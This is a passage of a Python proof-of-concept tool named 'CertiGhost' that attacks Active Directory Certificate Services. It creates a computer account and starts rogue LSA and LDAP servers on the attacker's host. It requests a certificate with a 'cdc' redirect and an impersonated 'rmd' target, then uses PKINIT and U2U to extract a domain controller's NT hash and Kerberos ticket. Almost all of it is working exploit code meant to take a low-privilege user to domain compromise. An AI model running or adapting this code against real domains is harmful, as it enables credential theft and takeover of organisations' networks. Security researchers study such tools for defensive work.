    enc_part = decoder.decode(dec, asn1Spec=EncASRepPart())[0]
    ci2 = _enctype_table[int(enc_part["key"]["keytype"])]
    sess_key = Key(ci2.enctype, bytes(enc_part["key"]["keyvalue"]))
    ccache = CCache(); ccache.fromTGT(tgt, k, None)
    ccname = f"{username.rstrip('$')}.ccache"
    Path(ccname).write_bytes(ccache.getData())
    # U2U to extract NT hash
    ap_req = AP_REQ(); ap_req["pvno"] = 5; ap_req["msg-type"] = e2i(constants.ApplicationTagNumbers.AP_REQ)
    ap_req["ap-options"] = constants.encodeFlags([])
    ticket = Ticket(); ticket = ticket.from_asn1(as_rep["ticket"])
    seq_set(ap_req, "ticket", ticket.to_asn1)
    authenticator = Authenticator(); authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = bytes(as_rep["crealm"])
    cn = Principal(); cn = cn.from_asn1(as_rep, "crealm", "cname")
    seq_set(authenticator, "cname", cn.components_to_asn1)
    now = datetime.now(timezone.utc)
    authenticator["cusec"] = now.microsecond; authenticator["ctime"] = KerberosTime.to_asn1(now)
    enc_auth = cipher.encrypt(sess_key, 7, encoder.encode(authenticator), None)
    ap_req["authenticator"] = noValue; ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = enc_auth
    tgs = TGS_REQ(); tgs["pvno"] = 5; tgs["msg-type"] = e2i(constants.ApplicationTagNumbers.TGS_REQ)
    tgs["padata"] = noValue; tgs["padata"][0] = noValue
    tgs["padata"][0]["padata-type"] = e2i(constants.PreAuthenticationDataTypes.PA_TGS_REQ)
    tgs["padata"][0]["padata-value"] = encoder.encode(ap_req)
    rb = seq_set(tgs, "req-body")
    opts = [e2i(constants.KDCOptions.forwardable), e2i(constants.KDCOptions.renewable),
            e2i(constants.KDCOptions.canonicalize), e2i(constants.KDCOptions.enc_tkt_in_skey),
            e2i(constants.KDCOptions.renewable_ok)]
    rb["kdc-options"] = constants.encodeFlags(opts)
    sn = Principal(username, type=e2i(constants.PrincipalNameType.NT_UNKNOWN))
    seq_set(rb, "sname", sn.components_to_asn1)
    rb["realm"] = str(as_rep["crealm"])
    rb["till"] = KerberosTime.to_asn1(datetime.now(timezone.utc) + timedelta(days=1))
    rb["nonce"] = getrandbits(31)
    seq_set_iter(rb, "etype", (int(cipher.enctype), e2i(constants.EncryptionTypes.rc4_hmac)))
    seq_set_iter(rb, "additional-tickets", (ticket.to_asn1(TicketAsn1()),))
    tgs_resp = sendReceive(encoder.encode(tgs), domain, dc_ip)
    tgs_rep = decoder.decode(tgs_resp, asn1Spec=TGS_REP())[0]
    ct = tgs_rep["ticket"]["enc-part"]["cipher"]
    nc = _enctype_table[int(tgs_rep["ticket"]["enc-part"]["etype"])]
    pt = nc.decrypt(sess_key, 2, ct)
    etp = decoder.decode(pt, asn1Spec=EncTicketPart())[0]
    ad_rel = decoder.decode(etp["authorization-data"][0]["ad-data"], asn1Spec=AD_IF_RELEVANT())[0]
    pac = PACTYPE(ad_rel[0]["ad-data"].asOctets()); buf = pac["Buffers"]
    sp_key = Key(18, t_key)
    nt_h = lm_h = None
    for _ in range(pac["cBuffers"]):
        ib = PAC_INFO_BUFFER(buf); data = pac["Buffers"][ib["Offset"]-8:][:ib["cbBufferSize"]]
        if ib["ulType"] == 2:
            ci3 = PAC_CREDENTIAL_INFO(data); nc2 = _enctype_table[ci3["EncryptionType"]]
            out = nc2.decrypt(sp_key, 16, ci3["SerializedData"])
            ts = TypeSerialization1(out); nd = out[len(ts)+4:]
            pcc = PAC_CREDENTIAL_DATA(nd)
            for cred in pcc["Credentials"]:
                cs2 = NTLM_SUPPLEMENTAL_CREDENTIAL(b"".join(cred["Credentials"]))
                lm_h = cs2["LmPassword"].hex() if any(cs2["LmPassword"]) else "aad3b435b51404eeaad3b435b51404ee"
                nt_h = cs2["NtPassword"].hex(); break
            break
        buf = buf[len(ib):]
    return nt_h, lm_h, ccname


MSRPC_UUID_ICPR = uuidtup_to_bin(("91ae6020-9e3c-11cf-8d7c-00aa00c091be", "0.0"))

class CERTTRANSBLOB(NDRSTRUCT):
    structure = (("cb", ULONG), ("pb", PBYTE))

class CertServerRequest(NDRCALL):
    opnum = 0
    structure = (("dwFlags", DWORD), ("pwszAuthority", LPWSTR), ("pdwRequestId", DWORD),
                 ("pctbAttribs", CERTTRANSBLOB), ("pctbRequest", CERTTRANSBLOB))

class CertServerRequestResponse(NDRCALL):
    structure = (("pdwRequestId", DWORD), ("pdwDisposition", ULONG),
                 ("pctbCert", CERTTRANSBLOB), ("pctbEncodedCert", CERTTRANSBLOB),
                 ("pctbDispositionMessage", CERTTRANSBLOB))

def request_cert(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
                 attacker_ip, rmd_value, template="Machine"):
    key = rsa_mod.generate_private_key(65537, 2048)
    hostname = f"{comp_name.rstrip('$')}.{domain}"
    csr = (x509.CertificateSigningRequestBuilder()
           .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
           .add_extension(x509.SubjectAlternativeName([x509.DNSName(hostname)]), critical=False)
           .sign(key, hashes.SHA256()))
    csr_der = csr.public_bytes(Encoding.DER)
    attrs = [f"CertificateTemplate:{template}", f"SAN:dns={hostname}",
             f"cdc:{attacker_ip}", f"rmd:{rmd_value}"]
    attr_bytes = checkNullString("\n".join(attrs)).encode("utf-16le")
    pctb_attribs = CERTTRANSBLOB(); pctb_attribs["cb"] = len(attr_bytes); pctb_attribs["pb"] = attr_bytes
    pctb_request = CERTTRANSBLOB(); pctb_request["cb"] = len(csr_der); pctb_request["pb"] = csr_der
    req = CertServerRequest(); req["dwFlags"] = 0
    req["pwszAuthority"] = checkNullString(ca_name)
    req["pdwRequestId"] = 0; req["pctbAttribs"] = pctb_attribs; req["pctbRequest"] = pctb_request
    nt = comp_hash; dce = None
    try:
        binding = f"ncacn_np:{ca_ip}[\\pipe\\cert]"
        rpctransport = transport.DCERPCTransportFactory(binding)
        rpctransport.setRemoteHost(ca_ip)
        rpctransport.set_credentials(comp_name, "", domain, "", nt)
        rpctransport.set_kerberos(False, kdcHost=dc_ip)
        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.connect(); dce.bind(MSRPC_UUID_ICPR)
    except Exception:
        dce = None
    if dce is None:
        try:
            ep = epm.hept_map(ca_ip, MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
            rpctransport = transport.DCERPCTransportFactory(ep)
            rpctransport.setRemoteHost(ca_ip)
            rpctransport.set_credentials(comp_name, "", domain, "", nt)
            rpctransport.set_kerberos(False, kdcHost=dc_ip)
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect(); dce.bind(MSRPC_UUID_ICPR)
        except Exception as e:
            raise RuntimeError(f"Cannot connect to CA RPC: {e}")
    resp = dce.request(req, checkError=False)
    disp = resp["pdwDisposition"]
    if disp != 3:
        msg = b"".join(resp["pctbDispositionMessage"]["pb"]).decode("utf-16le", errors="replace")
        raise RuntimeError(f"Cert request denied (0x{disp & 0xFFFFFFFF:08x}): {msg}")
    cert_der = b"".join(resp["pctbEncodedCert"]["pb"])
    cert = x509.load_der_x509_certificate(cert_der)
    pfx = pkcs12.serialize_key_and_certificates(b"", key, cert, None, NoEncryption())
    return pfx


def create_computer_ldaps(conn, dn, comp_name, comp_pass):
    comp_dn = f"CN={comp_name.rstrip('$')},CN=Computers,{dn}"
    attrs = {"sAMAccountName": comp_name,
             "userAccountControl": "4096",
             "unicodePwd": f'"{comp_pass}"'.encode("utf-16-le")}
    conn.add(comp_dn, ["top", "person", "organizationalPerson", "user", "computer"], attrs)

def create_computer_samr(dc_ip, domain, username, password, lmhash, nthash, comp_name, comp_pass):
    binding = epm.hept_map(dc_ip, samr.MSRPC_UUID_SAMR, protocol='ncacn_np')
    rpctransport = transport.DCERPCTransportFactory(binding)
    rpctransport.setRemoteHost(dc_ip)
    rpctransport.set_credentials(username, password, domain, lmhash, nthash)
    dce = rpctransport.get_dce_rpc(); dce.connect(); dce.bind(samr.MSRPC_UUID_SAMR)
    r = samr.hSamrConnect5(dce, '\\\\%s\x00' % dc_ip,
        samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN)
    servHandle = r['ServerHandle']
    domains = samr.hSamrEnumerateDomainsInSamServer(dce, servHandle)['Buffer']['Buffer']
    nb_target = dns2nb(domain)
    try: sel = next(d['Name'] for d in domains if d['Name'].lower() == nb_target.lower())
    except StopIteration: sel = [d for d in domains if d['Name'].lower() != 'builtin'][0]['Name']
    domSID = samr.hSamrLookupDomainInSamServer(dce, servHandle, sel)['DomainId']
    domHandle = samr.hSamrOpenDomain(dce, servHandle,
        samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER, domSID)['DomainHandle']
    try:
        samr.hSamrLookupNamesInDomain(dce, domHandle, [comp_name])
        raise RuntimeError(f"{comp_name} already exists")
    except samr.DCERPCSessionError as e:
        if e.error_code != 0xc0000073: raise
    r = samr.hSamrCreateUser2InDomain(dce, domHandle, comp_name,
        samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE)
    userHandle = r['UserHandle']
    samr.hSamrSetPasswordInternal4New(dce, userHandle, comp_pass)
    openUser = samr.hSamrOpenUser(dce, domHandle, samr.MAXIMUM_ALLOWED,
        samr.hSamrLookupNamesInDomain(dce, domHandle, [comp_name])['RelativeIds']['Element'][0])
    req = samr.SAMPR_USER_INFO_BUFFER()
    req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
    samr.hSamrSetInformationUser2(dce, openUser['UserHandle'], req)
    samr.hSamrCloseHandle(dce, openUser['UserHandle'])
    samr.hSamrCloseHandle(dce, domHandle)
    samr.hSamrCloseHandle(dce, servHandle)
    dce.disconnect()

def create_computer(conn, dc_ip, domain, username, password, lmhash, nthash, comp_name, comp_pass, dn):
    try:
        create_computer_ldaps(conn, dn, comp_name, comp_pass)
    except Exception:
        create_computer_samr(dc_ip, domain, username, password, lmhash, nthash, comp_name, comp_pass)


def port_ok(h, p, t=1.0):
    try: s = socket.create_connection((h, p), t); s.close(); return True
    except: return False

def main():
    p = argparse.ArgumentParser(description="CertiGhost - cdc-redirect chain PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s -d playground.local -u lowpriv -p Password1234 --dc-ip 192.168.209.157
  %(prog)s -d corp.local -u user -p pass --dc-ip 10.0.0.1 --ca-ip 10.0.0.2
  %(prog)s -d corp.local -u user -p pass --dc-ip 10.0.0.1 --target-san SERVER01$""")
    p.add_argument("-d", "--domain", required=True, help="Domain DNS name")
    p.add_argument("-u", "--username", required=True, help="Low-priv domain user")
    auth = p.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password", help="User password")
    auth.add_argument("-H", "--hashes", help="NTLM hash (LM:NT or :NT)", metavar="[LM:]NT")
    p.add_argument("--dc-ip", required=True, help="Domain Controller IP")
    p.add_argument("--ca-ip", help="CA IP (optional)")
    p.add_argument("--ca", help="CA name (optional)")
    p.add_argument("--listener", help="Attacker IP for rogue servers (default: auto-detected)", metavar="IP")
    p.add_argument("--target-san", help="Computer account to impersonate, e.g. DC01$ or CA01$ (default: auto-discovered DC)", metavar="ACCOUNT$")
    p.add_argument("--template", default="Machine", help="Certificate template (default: Machine). Only templates with DNS name flags (nameFlag & 0x58000000) trigger the cdc chase")
    p.add_argument("--computer-name", help="Existing computer name (skip creation)")
    cred = p.add_mutually_exclusive_group()
    cred.add_argument("--computer-pass", help="Existing computer password")
    cred.add_argument("--computer-hash", help="Existing computer NT hash")
    p.add_argument("--use-ldap", action="store_true", help="Use LDAP (389) instead of LDAPS (636)")
    args = p.parse_args()

    if os.geteuid() != 0:
        print("[!] Must run as root (ports 445+389)"); sys.exit(1)

    domain, user, dc_ip = args.domain, args.username, args.dc_ip
    password = args.password or ""
    lmhash = nthash = ""
    if args.hashes:
        parts = args.hashes.split(":")
        lmhash = parts[0] if len(parts) > 1 else ""
        nthash = parts[-1]
    ca_ip = args.ca_ip
    nb = dns2nb(domain); dn = dns2dn(domain)

    logging.basicConfig(level=logging.CRITICAL, format="%(message)s")
    for ln in ["impacket", "impacket.smbserver", "impacket.dcerpc", "rogue_lsa", "rogue_ldap"]:
        logging.getLogger(ln).setLevel(logging.CRITICAL)

    print(f"[*] Connecting to {'LDAP' if args.use_ldap else 'LDAPS'}")
    conn = ldap_connect(dc_ip, domain, user, password, lmhash, nthash, dn, args.use_ldap)
    if not conn: print("[!] Cannot connect to LDAP"); sys.exit(1)

    print("[*] Detecting infrastructure")
    atk_ip = args.listener or detect_ip(dc_ip)
    if not atk_ip: print("[!] Cannot detect attacker IP (use --listener)"); sys.exit(1)

    ca_name = args.ca
    if not ca_name:
        e = ldap_query_one(conn, f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{dn}",
                           "(objectClass=pKIEnrollmentService)", ["cn", "dNSHostName"])
        if e:
            ca_name = str(e.get("cn", ""))
            if not ca_ip and e.get("dNSHostName"):
                ca_ip = dns_resolve(str(e["dNSHostName"]), dc_ip)
    if not ca_name: print("[!] Cannot detect CA name (use --ca)"); sys.exit(1)
    if not ca_ip: ca_ip = dc_ip

    target_name = args.target_san
    if not target_name:
        e = ldap_query_one(conn, dn,
            "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
            ["sAMAccountName"])
        if e: target_name = str(e["sAMAccountName"])
        if not target_name: print("[!] Cannot discover DC (use --target-san)"); sys.exit(1)
    if not target_name.endswith("$"):
        target_name += "$"

    e = ldap_query_one(conn, dn, f"(&(objectCategory=computer)(sAMAccountName={target_name}))",
                       ["dNSHostName", "objectSid", "sAMAccountName"])
    if not e: print(f"[!] Cannot find '{target_name}' in AD"); sys.exit(1)
    target_name = str(e["sAMAccountName"])
    target_dns = str(e["dNSHostName"]) if e.get("dNSHostName") else f"{target_name.rstrip('$')}.{domain}"
    raw_sid = e["objectSid"]
    target_sid_bin = raw_sid if isinstance(raw_sid, bytes) else raw_sid.encode()
    target_sid = bin2sid(target_sid_bin)

    de = ldap_query(conn, dn, "(objectClass=*)", ["objectSid", "objectGUID"], Scope('baseObject'))
    de = de[0] if de else None
    if de:
        ds = de["objectSid"]
        domain_sid = bin2sid(ds if isinstance(ds, bytes) else ds.encode())
        dg = de.get("objectGUID")
        dguid = (dg if isinstance(dg, bytes) else dg.encode()).hex() if dg else "00" * 16
    else:
        domain_sid = "-".join(target_sid.split("-")[:-1]); dguid = "00" * 16

    print(f"    DC: {dc_ip} | CA: {ca_name} ({ca_ip})")
    print(f"    Target: {target_name} | SID: {target_sid}")

    if args.computer_name and (args.computer_hash or args.computer_pass):
        comp_name = args.computer_name
        if not comp_name.endswith("$"): comp_name += "$"
        comp_pass = args.computer_pass or ""
        comp_hash = args.computer_hash or compute_nthash(comp_pass)
        print(f"[*] Using existing computer: {comp_name}")
    else:
        rnd = "".join(random.choices(string.ascii_uppercase, k=8))
        comp_name = f"GHOST{rnd}$"
        comp_pass = "CG" + secrets.token_hex(10) + "Aa1"
        print(f"[*] Creating computer: {comp_name}")
        try:
            create_computer(conn, dc_ip, domain, user, password, lmhash, nthash, comp_name, comp_pass, dn)
        except Exception as e:
            print(f"[!] Computer creation failed: {e}"); sys.exit(1)
        comp_hash = compute_nthash(comp_pass)

    try:
        print("[*] Starting rogue servers (LSA:445 + LDAP:389)")
        guid_le = bytes.fromhex(dguid) if dguid else b"\x00" * 16
        threading.Thread(target=run_lsa, daemon=True,
            args=("0.0.0.0", 445, nb, domain, domain, guid_le, domain_sid,
                  comp_name, comp_hash, comp_pass, domain, dc_ip)).start()

        ldap_srv = RogueLDAP(domain, nb, comp_name, comp_hash, domain, dc_ip,
                              target_sid_bin, target_dns, target_name.rstrip("$"), target_name)
        threading.Thread(target=ldap_srv.serve, daemon=True, args=("0.0.0.0", 389)).start()

        for _ in range(15):
            time.sleep(1)
            if port_ok("127.0.0.1", 445) and port_ok("127.0.0.1", 389): break
        else:
            print("[!] Rogue servers failed to start"); sys.exit(1)

        print(f"[*] Requesting certificate (template={args.template}, cdc={atk_ip})")
        pfx_data = request_cert(ca_ip, ca_name, domain, comp_name, comp_hash,
                                dc_ip, atk_ip, target_dns, args.template)
        pfx_name = f"{target_name.rstrip('$').lower()}.pfx"
        Path(pfx_name).write_bytes(pfx_data)
        print(f"    Saved: {pfx_name}")

        print(f"[*] PKINIT as {target_name}")
        nt_h, lm_h, ccname = pkinit_and_hash(pfx_data, target_name.lower(), domain, dc_ip)

        if nt_h:
            print(f"[*] Got hash for {target_name}:")
            print(f"    {target_name}:{lm_h}:{nt_h}")
            print(f"    ccache: {ccname}")
        else:
            print(f"[!] Could not extract NT hash from PAC")

        print("[*] GGWP")
    except Exception as e:
        print(f"[!] Failed: {e}")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda *_: sys.exit(1))
    main()
